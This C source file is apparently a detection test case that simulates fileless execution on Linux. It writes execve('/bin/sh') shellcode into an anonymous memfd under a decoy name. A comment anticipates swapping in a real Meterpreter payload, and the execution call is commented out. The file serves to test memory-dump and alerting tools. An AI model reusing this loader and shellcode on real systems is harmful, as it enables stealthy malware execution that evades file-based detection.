/*
 * Test Case 1: memfd Fileless Execution Loader
 * 
 * This loader demonstrates fileless execution by:
 * 1. Creating an anonymous memory file descriptor (memfd_create)
 * 2. Writing shellcode/payload to the memfd
 * 3. Executing from memfd using fexecve()
 * 
 * Detection: Should trigger "memfd execution" alerts
 * Memory Dump: Payload should be captured from executable memfd regions
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>

// Meterpreter reverse shell placeholder - will be replaced with actual payload
// This is a simple execve("/bin/sh") shellcode for testing
unsigned char payload[] = 
    "\x48\x31\xd2"                          // xor rdx, rdx
    "\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68"  // mov rbx, '/bin/sh'
    "\x48\xc1\xeb\x08"                      // shr rbx, 8
    "\x53"                                  // push rbx
    "\x48\x89\xe7"                          // mov rdi, rsp
    "\x50"                                  // push rax
    "\x57"                                  // push rdi
    "\x48\x89\xe6"                          // mov rsi, rsp
    "\xb0\x3b"                              // mov al, 59 (execve)
    "\x0f\x05";                             // syscall

unsigned int payload_len = sizeof(payload) - 1;

// ELF header for x86_64 executable that runs our shellcode
unsigned char elf_header[] = {
    0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00,  // ELF magic + 64-bit
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x02, 0x00, 0x3e, 0x00, 0x01, 0x00, 0x00, 0x00,  // executable, x86_64
    0x78, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00,  // entry point
    0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // program header offset
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x38, 0x00,
    0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    // Program header
    0x01, 0x00, 0x00, 0x00, 0x05, 0x00, 0x00, 0x00,  // PT_LOAD, executable
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00,  // vaddr
    0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // filesz
    0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // memsz
    0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
};

int main(int argc, char **argv) {
    printf("[*] Test Case 1: memfd Fileless Execution\n");
    printf("[*] This simulates malware using memfd_create for fileless execution\n");
    
    // Create anonymous file descriptor
    int fd = syscall(SYS_memfd_create, "legitimate_name", MFD_CLOEXEC);
    if (fd == -1) {
        perror("memfd_create");
        return 1;
    }
    printf("[+] Created memfd: fd=%d\n", fd);
    
    // Write minimal ELF header
    if (write(fd, elf_header, sizeof(elf_header)) != sizeof(elf_header)) {
        perror("write header");
        close(fd);
        return 1;
    }
    
    // Seek to entry point location and write payload
    lseek(fd, 0x78, SEEK_SET);
    if (write(fd, payload, payload_len) != payload_len) {
        perror("write payload");
        close(fd);
        return 1;
    }
    printf("[+] Wrote %d bytes of shellcode to memfd\n", payload_len);
    
    // Make it executable
    char fd_path[64];
    snprintf(fd_path, sizeof(fd_path), "/proc/self/fd/%d", fd);
    if (chmod(fd_path, 0755) == -1) {
        perror("chmod");
        close(fd);
        return 1;
    }
    
    printf("[+] Sleeping 30 seconds to allow memory dump...\n");
    printf("[!] Monitor should detect: memfd execution\n");
    printf("[!] Memory dump should contain shellcode at executable memfd region\n");
    
    sleep(30);
    
    // Optional: Actually execute (commented out for safety)
    // char *args[] = { "memfd_payload", NULL };
    // char *env[] = { NULL };
    // fexecve(fd, args, env);
    
    printf("[*] Test complete - payload remained in memory without execution\n");
    close(fd);
    
    return 0;
}
